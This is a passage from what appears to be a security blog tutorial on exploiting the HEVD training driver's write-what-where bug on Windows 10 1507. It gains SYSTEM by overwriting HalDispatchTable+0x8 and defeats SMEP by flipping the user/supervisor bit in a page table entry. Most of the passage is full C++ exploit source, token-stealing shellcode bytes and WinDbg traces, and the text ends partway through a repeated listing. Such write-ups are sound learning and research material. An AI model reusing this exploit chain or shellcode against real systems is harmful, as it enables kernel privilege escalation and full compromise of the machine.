The idea is that once we control the kernel thread execution flow, we change the `0x4` bit, which dictates whether a page is Kernel mode or User mode, to `0`. This way, the modified page, where our shellcode is located will be a kernel-mode page, so `SMEP` won’t give us any issues.

As I mentioned earlier, we first need to focus on the vulnerability and how to exploit it, in this case, a `Write-What-Where`.

Windows host version -> `Windows 10 1507`

Before we begin, huge thanks to Morten Schenk for his outstanding research, as well as to [Connor McGarr](https://connormcgarr.github.io/) and [ommadawn46](https://github.com/ommadawn46) for their educational work and excellent blogs, which greatly contributed to the knowledge shared in this post.


### Write-What-Where Vuln (HEVD)
Let’s dive into the vulnerability.

![](imgs/blog/2SmepBypass/20250419181138.png)
 we can see, the IOCTL code is `0x22200B`, which we can call from UM.

The function calls **`ArbitraryWriteIoctlHandler()`**, which looks like this:
```cpp
int __fastcall ArbitraryWriteIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
{
  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; // rcx
  int result; // eax

  Parameters = IrpSp->Parameters.CreatePipe.Parameters;
  result = 0xC0000001;
  if ( Parameters )
    return TriggerArbitraryWrite((_WRITE_WHAT_WHERE *)Parameters);
  return result;
}
```
As shown, it retrieves the parameters from UM and casts them into a structure, `_WRITE_WHAT_WHERE`, which seems to be a 16-byte struct with two pointers:
```cpp
typedef struct _WRITE_WHAT_WHERE{
	void *What;
	void *Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;
```

Here’s the actual vulnerable function:
```cpp
__int64 __fastcall TriggerArbitraryWrite(_WRITE_WHAT_WHERE *UserWriteWhatWhere)
{
  unsigned __int64 *What; // rbx
  unsigned __int64 *Where; // rdi

  ProbeForRead(UserWriteWhatWhere, 0x10ui64, 1u);
  What = UserWriteWhatWhere->What;
  Where = UserWriteWhatWhere->Where;
  DbgPrintEx(0x4Du, 3u, "[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
  DbgPrintEx(0x4Du, 3u, "[+] WRITE_WHAT_WHERE Size: 0x%X\n", 16i64);
  DbgPrintEx(0x4Du, 3u, "[+] UserWriteWhatWhere->What: 0x%p\n", What);
  DbgPrintEx(0x4Du, 3u, "[+] UserWriteWhatWhere->Where: 0x%p\n", Where);
  DbgPrintEx(0x4Du, 3u, "[+] Triggering Arbitrary Write\n");
  *Where = *What;
  return 0i64;
}
```

And this is the line `*Where = *What;` that allows us to exploit the code.

In ASM:
```asm
...
PAGE:0000000140085F1A                 mov     rax, [rbx]
PAGE:0000000140085F1D                 mov     [rdi], rax
...
```

Now it’s time to figure out how to take advantage of this. Let’s write a small POC.

```cpp
...
	char* str = (char*)"CCCCCCCCCCCCC";
	char* str2 = (char*)"AAAAAAAAAAAAA";

	WRITE_WHAT_WHERE WhaWhe = { 0 };
	WhaWhe.Where = &str;
	WhaWhe.What = &str2;

	printf("\nstr: %s\n", str);
	printf("str2: %s\n", str2);

	ULONG lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);

	printf("\nstr: %s\n", str);
	printf("str2: %s\n", str2);
...
```
The result:
![](imgs/blog/2SmepBypass/20250419200718.png)
As we can see, we can overwrite content at any address no matter if it is User mode or Kernel mode.

Next, let’s exploit this using a `syscall` we can trigger from UM: **`NtQueryIntervalProfile`**, which we’ll now take a look at.

```cpp
NTSTATUS __stdcall NtQueryIntervalProfile(KPROFILE_SOURCE ProfileSource, PULONG Interval)
{
  PULONG v2; // rbx

  v2 = Interval;
  if ( KeGetCurrentThread()->PreviousMode )
  {
    if ( (unsigned __int64)Interval >= MmUserProbeAddress )
      Interval = (PULONG)MmUserProbeAddress;
    *Interval = *Interval;
  }
  *v2 = KeQueryIntervalProfile(ProfileSource);
  return 0;
}
```

As we can see, it calls **`KeQueryIntervalProfile()`**, whose pseudo-code looks like this:
```cpp
__int64 __fastcall KeQueryIntervalProfile(int a1)
{
  int v2; // [rsp+20h] [rbp-28h] BYREF
  char v3; // [rsp+24h] [rbp-24h]
  unsigned int v4; // [rsp+28h] [rbp-20h]
  char v5; // [rsp+50h] [rbp+8h] BYREF

  if ( a1 == 1 )
    return (unsigned int)KiProfileAlignmentFixupInterval;
  v2 = a1;
  if ( (int)((__int64 (__fastcall *)(__int64, __int64, int *, char *))off_1403147D8)(1i64, 24i64, &v2, &v5) >= 0 && v3 )
    return v4;
  else
    return 0i64;
}
```
This is the function running in KM once the syscall is executed. But here’s the interesting part: the function is calling another static function, **`HalDispatchTable()`**, our golden goose.
![](imgs/blog/2SmepBypass/20250419222611.png)

Let’s take a look at the disasm of **`KeQueryIntervalProfile()`**
```WinDbg
nt!KeQueryIntervalProfile:
fffff804`104f14c4 4883ec58        sub     rsp,58h
fffff804`104f14c8 83f901          cmp     ecx,1
fffff804`104f14cb 7436            je      nt!KeQueryIntervalProfile+0x3f (fffff804`104f1503)
fffff804`104f14cd 488b05047adcff  mov     rax,qword ptr [nt!HalDispatchTable+0x8 (fffff804`102b8ed8)]
fffff804`104f14d4 4c8d4c2460      lea     r9,[rsp+60h]
fffff804`104f14d9 ba18000000      mov     edx,18h
fffff804`104f14de 894c2430        mov     dword ptr [rsp+30h],ecx
fffff804`104f14e2 4c8d442430      lea     r8,[rsp+30h]
fffff804`104f14e7 8d4ae9          lea     ecx,[rdx-17h]
fffff804`104f14ea e831c3b7ff      call    nt!guard_dispatch_icall (fffff804`1006d820)
fffff804`104f14ef 85c0            test    eax,eax
fffff804`104f14f1 7818            js      nt!KeQueryIntervalProfile+0x47 (fffff804`104f150b)
fffff804`104f14f3 807c243400      cmp     byte ptr [rsp+34h],0
fffff804`104f14f8 7411            je      nt!KeQueryIntervalProfile+0x47 (fffff804`104f150b)
fffff804`104f14fa 8b442438        mov     eax,dword ptr [rsp+38h]
fffff804`104f14fe 4883c458        add     rsp,58h
fffff804`104f1502 c3              ret
fffff804`104f1503 8b057b98deff    mov     eax,dword ptr [nt!KiProfileAlignmentFixupInterval (fffff804`102dad84)]
fffff804`104f1509 ebf3            jmp     nt!KeQueryIntervalProfile+0x3a (fffff804`104f14fe)
fffff804`104f150b 33c0            xor     eax,eax
fffff804`104f150d ebef            jmp     nt!KeQueryIntervalProfile+0x3a (fffff804`104f14fe)
fffff804`104f150f cc              int     3
```

The call goes to `nt!HalDispatchTable+0x8 (fffff804'102b8ed8)`
```WinDbg
5: kd> u nt!HalDispatchTable+0x8
nt!HalDispatchTable+0x8:
fffff804`102b8ed8 10a0e90f04f8    adc     byte ptr [rax-7FBF017h],ah
fffff804`102b8ede ff              ???
fffff804`102b8edf ffb08ee90f04    push    qword ptr [rax+40FE98Eh]
fffff804`102b8ee5 f8              clc
fffff804`102b8ee6 ff              ???
fffff804`102b8ee7 ff00            inc     dword ptr [rax]
fffff804`102b8ee9 e54e            in      eax,4Eh
fffff804`102b8eeb 1004f8          adc     byte ptr [rax+rdi*8],al
...
```
Our goal is to replace this with our shellcode’s address.

To do this we must:
- [ ] Get the address of `ntoskrnl.exe`
- [ ] Get the address of **`[HalDispatchTable + 0x08]`**
- [ ] Overwrite it with our shellcode address
- [ ] Trigger the call to **`KeQueryIntervalProfile`**
- [ ] Execute our shellcode

And here’s how we do it:
```cpp
#include <stdio.h>
#include <windows.h>

#define MAXIMUM_FILENAME_LENGTH 255 

//0x4 bytes (sizeof)
enum _KPROFILE_SOURCE
{
	ProfileTime = 0,
	ProfileAlignmentFixup = 1,
	ProfileTotalIssues = 2,
	ProfilePipelineDry = 3,
	ProfileLoadInstructions = 4,
	ProfilePipelineFrozen = 5,
	ProfileBranchInstructions = 6,
	ProfileTotalNonissues = 7,
	ProfileDcacheMisses = 8,
	ProfileIcacheMisses = 9,
	ProfileCacheMisses = 10,
	ProfileBranchMispredictions = 11,
	ProfileStoreInstructions = 12,
	ProfileFpInstructions = 13,
	ProfileIntegerInstructions = 14,
	Profile2Issue = 15,
	Profile3Issue = 16,
	Profile4Issue = 17,
	ProfileSpecialInstructions = 18,
	ProfileTotalCycles = 19,
	ProfileIcacheIssues = 20,
	ProfileDcacheAccesses = 21,
	ProfileMemoryBarrierCycles = 22,
	ProfileLoadLinkedIssues = 23,
	ProfileMaximum = 24
};

typedef NTSTATUS (*_NtQueryIntervalProfile)(
	IN _KPROFILE_SOURCE      ProfileSource,
	OUT PULONG              Interval);

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

typedef struct _WRITE_WHAT_WHERE {
	void* What;
	void* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;


char pShellcode[] = {
	0x90, 0x90
};


void SpawnShell() {

	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, nullptr, &Si, &Pi);
}


UINT64 GetNtBase() {
	NTSTATUS Status = 0x0;
	ULONG ReturnLength = 0;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

	if (NtQuerySystemInformation == nullptr) {
		printf("\n[ERROR GETTING THE ADDRESS TO \"NtQuerySystemInformation\"]\n");
		return 0;
	}

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &ReturnLength);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr, ReturnLength,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, ReturnLength, &ReturnLength);
	if (Status != 0x0) {
		printf("\nError getting the length of the Module Struct -> 0x%0.16X\n", Status);
		return 0;
	}

	printf("\n[Module Name] %s\n\t\\__[Base Address] 0x%p\n\t\\__[Module Size] %p\n",
		pModuleInfo->Modules[0].Name, pModuleInfo->Modules[0].ImageBaseAddress, pModuleInfo->Modules[0].ImageSize);

	char* ModuleName = pModuleInfo->Modules[0].Name;
	PVOID ModuleBase = pModuleInfo->Modules[0].ImageBaseAddress;
	ULONG ModuleSize = pModuleInfo->Modules[0].ImageSize;

	printf("\npModuleInfo->Modules[0] -> 0x%p\n", pModuleInfo->Modules[0]);

	VirtualFree(pModuleInfo, ReturnLength, MEM_RELEASE);

	return (UINT64)ModuleBase;
}


int main() {

	UINT64 pKernelBase = GetNtBase();

	if (pKernelBase == 0) {
		printf("\n[!] ERROR GETTING THE KERNEL BASE ADDRESS\n");
		getchar();
		return -1;
	}
	printf("\n[KERNEL BASE] -> 0x%p\n", pKernelBase);

	HMODULE hKernelBase = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
	if (hKernelBase == INVALID_HANDLE_VALUE) {
		printf("\n[!] ERROR GETTING A HANDLE TO \"ntoskrnl.exe\": %d\n", GetLastError());
		getchar();
		return -1;
	}
	printf("\n[hKernelBase] -> 0x%p\n", hKernelBase);

	UINT64 OffHalDispatchTable = 0;
	PVOID pHalDispatchTable = GetProcAddress(hKernelBase, "HalDispatchTable");
	if (pHalDispatchTable == nullptr) {
		printf("\n[!] ERROR GETTING THE ADDRESS TO \"HalDispatchTable\": %d\n", GetLastError());
		CloseHandle(hKernelBase);
		getchar();
		return -1;
	}
	else {
		OffHalDispatchTable = (UINT_PTR)pHalDispatchTable - (UINT_PTR)hKernelBase;
		printf("\n[HalDispatchTable KM Address] -> 0x%p\n\t\\__[HalDispatchTable Offset] -> 0x%p\n", (pKernelBase + OffHalDispatchTable), OffHalDispatchTable);
		CloseHandle(hKernelBase);
	}

	HANDLE hHEVD = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),
		0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hHEVD == INVALID_HANDLE_VALUE) {
		printf("\nError getting a handle to the driver\n");
		CloseHandle(hKernelBase);
		getchar();
		return -1;
	}
	printf("\nHANDLE created successfully!\n");

	UINT64 HalDispatchTable0x8 = (pKernelBase + OffHalDispatchTable + 0x8);

	void* ShellcodeAddr = VirtualAlloc(nullptr, 150, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(ShellcodeAddr, pShellcode, 150);

	WRITE_WHAT_WHERE WhaWhe = { 0 };
	WhaWhe.What = (void*)&ShellcodeAddr;
	WhaWhe.Where = (void*)HalDispatchTable0x8;

	ULONG lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == nullptr) {
		printf("\n[!] ERROR GETTING THE POINTER TO \"NtQueryIntervalProfile\": %d\n", GetLastError());
		VirtualFree(ShellcodeAddr, 150, MEM_RELEASE);
		CloseHandle(hHEVD);
		getchar();
		return -1;
	}
	printf("\n[NtQueryIntervalProfile] -> 0x%p\n", NtQueryIntervalProfile);

	ULONG Interval = 0;
	NTSTATUS Status = NtQueryIntervalProfile((_KPROFILE_SOURCE)0x3, &Interval);
	if (Status != 0) {
		printf("\nERROR EXECUTING \"NtQueryIntervalProfile\": 0x%0.16X\n", Status);
		VirtualFree(ShellcodeAddr, 150, MEM_RELEASE);
		CloseHandle(hHEVD);
		getchar();
		return -1;
	}

	SpawnShell();

	VirtualFree(ShellcodeAddr, 150, MEM_RELEASE);
	CloseHandle(hHEVD);
	return 0;
}
```

But, as we pointed out at the beginning of this section...
```WinDbg
6: kd> g
Breakpoint 0 hit
nt!KeQueryIntervalProfile:
fffff801`10bb1410 4883ec48        sub     rsp,48h
0: kd> t
nt!KeQueryIntervalProfile+0x4:
fffff801`10bb1414 83f901          cmp     ecx,1
0: kd> 
nt!KeQueryIntervalProfile+0x7:
fffff801`10bb1417 7430            je      nt!KeQueryIntervalProfile+0x39 (fffff801`10bb1449)
0: kd> 
nt!KeQueryIntervalProfile+0x9:
fffff801`10bb1419 ba18000000      mov     edx,18h
0: kd> 
nt!KeQueryIntervalProfile+0xe:
fffff801`10bb141e 894c2420        mov     dword ptr [rsp+20h],ecx
0: kd> 
nt!KeQueryIntervalProfile+0x12:
fffff801`10bb1422 4c8d4c2450      lea     r9,[rsp+50h]
0: kd> 
nt!KeQueryIntervalProfile+0x17:
fffff801`10bb1427 4c8d442420      lea     r8,[rsp+20h]
0: kd> 
nt!KeQueryIntervalProfile+0x1c:
fffff801`10bb142c 8d4ae9          lea     ecx,[rdx-17h]
0: kd> 
nt!KeQueryIntervalProfile+0x1f:
fffff801`10bb142f ff15a383ddff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff801`109897d8)]
0: kd> dq nt!HalDispatchTable+0x8 L1
fffff801`109897d8  00000003`2b2f0000
0: kd> u 00000003`2b2f0000
00000003`2b2f0000 4831c0          xor     rax,rax
00000003`2b2f0003 4d31c9          xor     r9,r9
00000003`2b2f0006 4831c9          xor     rcx,rcx
00000003`2b2f0009 65488b042588010000 mov   rax,qword ptr gs:[188h]
00000003`2b2f0012 488b8020020000  mov     rax,qword ptr [rax+220h]
00000003`2b2f0019 4989c1          mov     r9,rax
00000003`2b2f001c 4d8b89f0020000  mov     r9,qword ptr [r9+2F0h]
00000003`2b2f0023 4981e9f0020000  sub     r9,2F0h
0: kd> t
00000003`2b2f0000 4831c0          xor     rax,rax
0: kd> 
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x000000fc
                       (0x000000032B2F0000,0x22B000013DBB8867,0xFFFFD001CB0948E0,0x0000000080000005)


A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff801`107c7300 cc              int     3
```

![](imgs/blog/2SmepBypass/20250420021937.png)

As we can see, our shellcode address is written without issue and we can even reach it. The only problem is that due to `SMEP`, we can’t execute UM code in kernel context.

Let’s inspect the page permissions where the UM shellcode is located:
```WinDbg
2: kd> bp nt!KeQueryIntervalProfile
2: kd> bp HEVD!TriggerArbitraryWrite
2: kd> bp HEVD!TriggerArbitraryWrite+0xe3
2: kd> g
Breakpoint 1 hit
HEVD!TriggerArbitraryWrite:
fffff800`46d25e74 488bc4          mov     rax,rsp
5: kd> u ntkrnlmp!HalDispatchTable+0x8 L2
nt!HalDispatchTable+0x8:
fffff800`9c1907d8 90              nop
fffff800`9c1907d9 10e6            adc     dh,ah
5: kd> dq ntkrnlmp!HalDispatchTable+0x8 L2
fffff800`9c1907d8  fffff800`9be61090 fffff800`9be66d20
5: kd> g
Breakpoint 2 hit
HEVD!TriggerArbitraryWrite+0xe3:
fffff800`46d25f57 415e            pop     r14
5: kd> dq ntkrnlmp!HalDispatchTable+0x8 L2
fffff800`9c1907d8  000000af`fe950000 fffff800`9be66d20
5: kd> !pte 000000af`fe950000
                                           VA 000000affe950000
PXE at FFFFF6FB7DBED008    PPE at FFFFF6FB7DA015F8    PDE at FFFFF6FB402BFFA0    PTE at FFFFF68057FF4A80
contains 014000013363D867  contains 015000015273E867  contains 01C0000152345867  contains 2840000133CDC867
pfn 13363d    ---DA--UWEV  pfn 15273e    ---DA--UWEV  pfn 152345    ---DA--UWEV  pfn 133cdc    ---DA--UWEV
```
As we can see, it's a UM page. However, if we manage to flip the UM bit to make it look like a KM page, we can bypass this mitigation.

In kernel version 1507 (which we’re using), the Page Table Entry is persistent across reboots.
```WinDbg
0: kd> !pte 0000001a`9e6c0000
                                           VA 0000001a9e6c0000
PXE at FFFFF6FB7DBED000    PPE at FFFFF6FB7DA00350    PDE at FFFFF6FB4006A798    PTE at FFFFF6800D4F3600
contains 0140000129A50867  contains 015000014D651867  contains 073000012846E867  contains 22D000000DAC0867
pfn 129a50    ---DA--UWEV  pfn 14d651    ---DA--UWEV  pfn 12846e    ---DA--UWEV  pfn dac0      ---DA--UWEV

0: kd> ? 1a`9e6c0000>>9
Evaluate expression: 223294976 = 00000000`0d4f3600
```

It always be `0xFFFFF68000000000`

Still, in case it were randomized, we’d need to read the **`MiGetPteAddress`** function, which can help us programmatically (with arbitrary read/write context) get the base address and modify the page properties.
```cpp
; __int64 __fastcall MiGetPteAddress(unsigned __int64)
MiGetPteAddress proc near
shr     rcx, 9
mov     rax, 7FFFFFFFF8h
and     rcx, rax
mov     rax, 0FFFFF68000000000h
add     rax, rcx
retn
MiGetPteAddress endp
```
Its purpose is pretty clear.

But we can skip that due to what we just mentioned.

We only need the following formula:
```cpp
...
	UINT64 ShellcodePageBase = (ULONG_PTR)ShellcodeAddr >> 9;
	ShellcodePageBase &= 0x7FFFFFFFF8;
	ShellcodePageBase += 0xFFFFF68000000000;
...
```

![](imgs/blog/2SmepBypass/20250420042403.png)

![](imgs/blog/2SmepBypass/20250420042418.png)
As shown, we now get the PTE of our UM shellcode.

Now we’ll get the PTE value and modify it to turn the User page into a Kernel page.

| Bit   | Display when set | Display when clear | Meaning                                                                                                                                     |
| :---- | :--------------- | :----------------- | :------------------------------------------------------------------------------------------------------------------------------------------ |
| 0x200 | C                | -                  | Copy on write.                                                                                                                              |
| 0x100 | G                | -                  | Global.                                                                                                                                     |
| 0x80  | L                | -                  | Large page. This only occurs in PDEs, never in PTEs.                                                                                        |
| 0x40  | D                | -                  | Dirty.                                                                                                                                      |
| 0x20  | A                | -                  | Accessed.                                                                                                                                   |
| 0x10  | N                | -                  | Cache disabled.                                                                                                                             |
| 0x8   | T                | -                  | Write-through.                                                                                                                              |
| 0x4   | U                | K                  | Owner (user mode or kernel mode).                                                                                                           |
| 0x2   | W                | R                  | Writeable or read-only. Only on multiprocessor computers and any computer running Windows Vista or later.                                   |
| 0x1   | V                |                    | Valid.                                                                                                                                      |
|       | E                | -                  | Executable page. For platforms that do not support a hardware execute/noexecute bit, including many x86 systems, the E is always displayed. |

Here’s how we do it:
```cpp
...
	UINT64 ShellcodePageBase = (ULONG_PTR)ShellcodeAddr >> 9;
	ShellcodePageBase &= 0x7FFFFFFFF8;
	ShellcodePageBase += 0xFFFFF68000000000;

	printf("\n[UM Shellcode Page Base] -> 0x%p\n", ShellcodePageBase);

	PVOID Pte_details = nullptr;

	WhaWhe.What = (void*)ShellcodePageBase;
	WhaWhe.Where = (void*)&Pte_details;

	ULONG lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;
	
	printf("\n[+] PTE Details -> 0x%p\n", Pte_details);

	printf("\n[0x4 bit form U to K]\n");
	// Clean U/S bit
	*(UINT64*)&Pte_details &= ~(0x4);
	printf("\n[+] PTE Details -> 0x%p\n", Pte_details);


	WhaWhe.What = (void*)&Pte_details;
	WhaWhe.Where = (void*)ShellcodePageBase;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	printf("\n[Page changed to Kernel Mode]\n");

	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

...
```

![](imgs/blog/2SmepBypass/20250420173325.png)

Let’s check the result in `WinDbg`:
```WinDbg
nt!DbgBreakPointWithStatus:
fffff802`fef58300 cc              int     3
0: kd> bp nt!KeQueryIntervalProfile
0: kd> g
Breakpoint 0 hit
nt!KeQueryIntervalProfile:
fffff802`ff342410 4883ec48        sub     rsp,48h
5: kd> dq ntkrnlmp!HalDispatchTable+0x8 L1
fffff802`ff11a7d8  0000009d`85280000
5: kd> !pte 0000009d`85280000
                                           VA 0000009d85280000
PXE at FFFFF6FB7DBED008    PPE at FFFFF6FB7DA013B0    PDE at FFFFF6FB40276148    PTE at FFFFF6804EC29400
contains 0130000151A36867  contains 014000010DE37867  contains 0B4000014BE59867  contains 27D00001523C6863
pfn 151a36    ---DA--UWEV  pfn 10de37    ---DA--UWEV  pfn 14be59    ---DA--UWEV  pfn 1523c6    ---DA--KWEV
```

Which means we’ve successfully bypassed `SMEP`.

![](imgs/blog/2SmepBypass/20250420175226.png)
but we get a BSOD after that...

That’s why we need to restore the PTE structure and the `HalDispatchTable0x8` address to their original state.

The code to restore the state after the exploit is the following:
```cpp
...
	// Restore the changed address to avoid BSOD
	WhaWhe.What = (void*)&HalDispatchTable0x8;
	WhaWhe.Where = (void*)HalDispatchTable0x8;

	lpBytesReturned = 0;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);

	printf("\n[+] HalDispatchTable0x8 restored successfully\n");
	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;


	*(UINT64*)&Pte_details |= 0x4;

	WhaWhe.What = (void*)&Pte_details;
	WhaWhe.Where = (void*)ShellcodePageBase;
	DeviceIoControl(hHEVD, 0x22200B, &WhaWhe, sizeof(WRITE_WHAT_WHERE), nullptr, 0, &lpBytesReturned, nullptr);
	printf("[Page Restored successfully to UM]\n");

	WhaWhe.What = nullptr;
	WhaWhe.Where = nullptr;

	printf("\nGenerating a Shell...\n");

	SpawnShell();

	VirtualFree(ShellcodeAddr, SHELLCODE_SIZE, MEM_RELEASE);
	CloseHandle(hHEVD);
	return 0;
}
...
```

Let’s confirm everything’s working fine in WinDbg...
```WinDbg
nt!DbgBreakPointWithStatus:
fffff803`169cd300 cc              int     3
7: kd> bp nt!KeQueryIntervalProfile
7: kd> g
Breakpoint 0 hit
nt!KeQueryIntervalProfile:
fffff803`16db7410 4883ec48        sub     rsp,48h
3: kd> dq ntkrnlmp!HalDispatchTable+0x8 L1
fffff803`16b8f7d8  000000f2`8c1c0000
3: kd> !pte 000000f2`8c1c0000
                                           VA 000000f28c1c0000
PXE at FFFFF6FB7DBED008    PPE at FFFFF6FB7DA01E50    PDE at FFFFF6FB403CA300    PTE at FFFFF68079460E00
contains 0140000114A40867  contains 0150000144B41867  contains 0160000145242867  contains 2800000156ACF863
pfn 114a40    ---DA--UWEV  pfn 144b41    ---DA--UWEV  pfn 145242    ---DA--UWEV  pfn 156acf    ---DA--KWEV

3: kd> g
Break instruction exception - code 80000003 (first chance)
0033:00007ffa`9f780262 cc              int     3
3: kd> dq ntkrnlmp!HalDispatchTable+0x8 L1
fffff803`16b8f7d8  fffff803`16b8f7d8
3: kd> !pte 000000f2`8c1c0000
                                           VA 000000f28c1c0000
PXE at FFFFF6FB7DBED008    PPE at FFFFF6FB7DA01E50    PDE at FFFFF6FB403CA300    PTE at FFFFF68079460E00
contains 0140000114A40867  contains 0150000144B41867  contains 0160000145242867  contains 2800000156ACF867
pfn 114a40    ---DA--UWEV  pfn 144b41    ---DA--UWEV  pfn 145242    ---DA--UWEV  pfn 156acf    ---DA--UWEV

3: kd> g
```

Once everything is in place, we can execute our code.
![](imgs/blog/2SmepBypass/20250420183943.png)

```cpp

#include <stdio.h>
#include <windows.h>

#define MAXIMUM_FILENAME_LENGTH 255 

//0x4 bytes (sizeof)
enum _KPROFILE_SOURCE
{
	ProfileTime = 0,
	ProfileAlignmentFixup = 1,
	ProfileTotalIssues = 2,
	ProfilePipelineDry = 3,
	ProfileLoadInstructions = 4,
	ProfilePipelineFrozen = 5,
	ProfileBranchInstructions = 6,
	ProfileTotalNonissues = 7,
	ProfileDcacheMisses = 8,
	ProfileIcacheMisses = 9,
	ProfileCacheMisses = 10,
	ProfileBranchMispredictions = 11,
	ProfileStoreInstructions = 12,
	ProfileFpInstructions = 13,
	ProfileIntegerInstructions = 14,
	Profile2Issue = 15,
	Profile3Issue = 16,
	Profile4Issue = 17,
	ProfileSpecialInstructions = 18,
	ProfileTotalCycles = 19,
	ProfileIcacheIssues = 20,
	ProfileDcacheAccesses = 21,
	ProfileMemoryBarrierCycles = 22,
	ProfileLoadLinkedIssues = 23,
	ProfileMaximum = 24
};

typedef NTSTATUS (*_NtQueryIntervalProfile)(
	IN _KPROFILE_SOURCE      ProfileSource,
	OUT PULONG              Interval);

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

typedef struct _WRITE_WHAT_WHERE {
	void* What;
	void* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

/*

# define SHELLCODE_SIZE 3

char pShellcode[] = {
	0x90, 0XCC, 0xc3
};
*/

# define SHELLCODE_SIZE 80

char pShellcode[] = {
	0x48, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC9, 0x65, 
	0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 
	0x80, 0x20, 0x02, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x4D, 0x8B, 
	0x89, 0xF0, 0x02, 0x00, 0x00, 0x49, 0x81, 0xE9, 0xF0, 0x02, 
	0x00, 0x00, 0x49, 0x8B, 0x89, 0xE8, 0x02, 0x00, 0x00, 0x48, 
	0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x05, 0x58, 0x03, 0x00, 
	0x00, 0x4D, 0x8B, 0x89, 0x58, 0x03, 0x00, 0x00, 0x4C, 0x89, 
	0x08, 0x90, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

void SpawnShell() {

	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, nullptr, &Si, &Pi);
}


UINT64 GetNtBase() {
	NTSTATUS Status = 0x0;
	ULONG ReturnLength = 0;

